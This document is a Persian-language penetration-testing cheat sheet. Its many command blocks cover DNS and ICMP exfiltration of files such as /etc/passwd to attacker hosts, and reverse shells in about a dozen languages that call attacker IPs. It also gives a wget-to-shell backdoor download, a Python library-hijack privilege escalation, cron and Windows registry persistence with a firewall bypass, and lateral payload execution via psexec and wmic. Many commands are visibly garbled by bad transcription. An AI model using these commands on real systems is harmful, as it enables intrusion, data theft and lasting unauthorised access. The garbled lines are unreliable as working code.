---
layout: default
published: true
---

# نکات و ترفند ها

## انتقال فایل

### انتقال توسط ftp بدون دسترسی مستقیم به شل

```text
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file  tp.txt
echo bye ftp.txt
ftp -s:ftp.txt
```

### انتقال Dns در لینوکس

```text
On victim:
1. Hex encode the file to be transferred
   xxd -p secret file.hex
2. Read in each line and do a DNS lookup
   forb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done

On attacker:
1. Capture DNS exfil packets
   tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
   tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
   cut -f1 -d'.' | uniq received. txt
3. Reverse the hex encoding
   xxd -r -p received~.txt kefS.pgp
```

### اجرای دستور exfil و انتقال اطلاعات آن با icmp

```text
On victim (never ending 1 liner) :
    stringz=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter=0; while (($counter = ${#stringZ})) ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ;done

On attacker (capture pac~ets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

### باز نمودن mail relay

```text
C:\ telnet x.x.x.x 25
HELO x.x.x.x
MAIL FROM: me@you.com
RCPT TO: YOU@YOU.com
DATA
Thank You.
quit
```

## شل معکوس

### دستور Netcat \(\* اجرا در سیستم مهاجم\)

```text
nc 10.0.0.1 1234 -e /bin/sh    Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe    Windows reverse shell
```

### دستور Netcat \(ممکن است در بعضی از نسخه ها -e پشتیبانی نشود\)

```text
nc -e /bin/sh 10.0.0.1 1234
```

### دستور Netcat  برای موقع هایی که -e پشتیبانی نمی شود

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
```

### زبان Perl

```text
perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket(S,PF INET, SOCK STREAM,
getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'
```

### زبان Perl بدون نیاز به /bin/sh

```text
perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
c,w) ;system$_ while ;'
```

### زبان Perl برای windows

```text
perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
c,r) ;$~- fdopen($c,w) ;system$_ while ;'
```

### زبان Python

```text
python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
یا 

```text
check sudoer script content like:

#!/usr/bin/python3
from shutil import make_archive
src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
You have new mail in /var/mail/waldo

and create file for got root as shutil.py contains:

import os
import pty
import socket

lhost = "10.10.10.10"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
   def close(*args):
       return
   def __init__(self, *args):
       return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

and run sudoer script with 

sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```


### زبان Bash

```text
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

### زبان Java

```text
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()
```

### زبان Php

```text
php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
```

### زبان Ruby

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
```

### زبان Ruby بدون نیاز به /bin/sh

```text
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
") {| io|c.print io.read}end'
```

### زبان Ruby برای windows

```text
ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r" ) {|
io|c.print io.read}end'
```

### دستور Telnet

```text
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
--OR--
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
```

### دستور Xterm

```text
xterm -displaj 10.0.0.1:1
o Start Listener: Xnest :1
o Add permission to connect: xhost +victimiP
```

### متفرقه

```text
wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
```

### spawn شل

```text
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```text
try ctrl + z
stty raw -echo 
fg
```

```text
echo os.system('/bin/bash')
```

```text
/bin/sh -i
```


```text
perl —e 'exec "/bin/sh";'
```

```text
perl: exec "/bin/sh";
```

```text
ruby: exec "/bin/sh"
```

```text
lua: os.execute('/bin/sh')
```

```text
(From within IRB)
exec "/bin/sh"
```


```text
(From within vi)
:!bash
```

```text
(From within vi)
:set shell=/bin/bash:shell
```

```text
(From within nmap)
!sh
```

 [netsec.ws](http://netsec.ws/?p=337)

## ارتقا دسترسی

راهنما: https://gtfobins.github.io/

### افزایش دسترسی با docker

باید با کاربردی که عضو گروه docker است وارد شده باشید.

```text
docker run -v /root:/mnt -it ubuntu
```

### افزایش دسترسی در journalctl 

اجرا کننده journalctl باید با دسترسی بیشتری مانند sudo اجرا شده باشد.

```text
journalctl
!/bin/sh
```

یا

```text
sudo journalctl
!/bin/sh
```

### افزایش دسترسی با فایل 00-header

```text
echo “id” >> 00-header
```

## دسترسی همیشگی

### برای لینوکس \(در سیستم مهاجم\)

```text
crontab -e : set for every 10 min
0-59/10  nc ip 777 -e /bin/bash
```

### برای ویندوز \(شروع task scheduler\)

```text
sc config schedule start= auto
net start schedule
at 13:30 ""C:\nc.exe ip 777 -e cmd.exe""
```

### اجرای backdoor به همراه بایپس فایروال ویندوز

```text
1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
   /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC MINUTE /t10 45 /TN FIREWALL /TR
   "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

### توسعه پیلود در smb یا webdav

```text
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload

Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set following options:
    localexe= true
    localfile= payload
    localroot= payload directory
    disablePayloadHandler=true
3. Use psexec or wmic command to remotely execute payload
    psexec \\ remote ip /u domain\compromised_user /p password "\\payload
    ip \test\msf.exe"

OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\ \ payload ip \test\msf.exe"
```

## تونل 

### Fpipe - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2

```text
fpipe.exe -l 1234 -r 80 2.2.2.2
```

### Socks.exe - پویش اینترانت در پروکسی ساکس

```text
On redirector (1.1.1.1):
    socks.exe -i1.1.1.1 -p 8C80

On attacker:
Modify /etc/proxjchains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1    9050
Add line: socks4    1.1.1.1    8080
Scan through socks proxy:
    proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
```

### Socat - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2

```text
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
```

### Stunnel - ssl encapsulated در تونل nc \(ویندوز & لینوکس\) \[8\]

```text
On attacker (client):
Modify /stunnel.conf
    clien = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444

On victim (listening server)
Modify /stunnel.conf
    client = no
    [ne~cat server]
    accept = 4444
    connect = 7777
C:\ nc -vlp 7777

On attacker (client):
# nc -nv 127.0.0.1 5555
```

## نکات جست و جو در google

| **پارامتر** | **توضیح** |
| :--- | :--- |
| site: \[url\] | جست و جو یک سایت \[url\] |
| numrange: \[\#\]...\[\#\] | جست و جو در محدوده عددی |
| date: \[ \#\] | جست و جو در یک ماه گذشته |
| link: \[url\] | جست و جو صفحاتی که دارای آدرس خاصی است |
| related: \[url\] | جست و جو صفحات مرتبط با آدرس خاص |
| intitle: \[string\] | جست و جو صفحاتی که دارای عنوان خاصی است |
| inurl: \[string\] | جست و جو صفحاتی که در url آن دارای آدرس خاصی است|
| filetjpe: \[xls\] | جست و جو کلیه فایل های با پسوند xls |
| phonebook: \[name\] | جست و جو کلیه دفترچه تلفن هایی که دارای نام خاص می باشند |

## نکات Video teleconferencing

### برند Polycom

```text
telnet ip
#Enter 1 char, get uname:pwd
http:// ip /getsecure.cgi
http:// ip /er_a_rc1.htm
http:// ip /a_security.htm
http:// ip /a_rc.htm
```

### برند Trandberg

```text
http:// ip /snapctrl.ssi
```

### برند Sony webcam

```text
http:// ip /commard/visca-gen.cgi?visca= str
8101046202FF : Freeze Camera
```
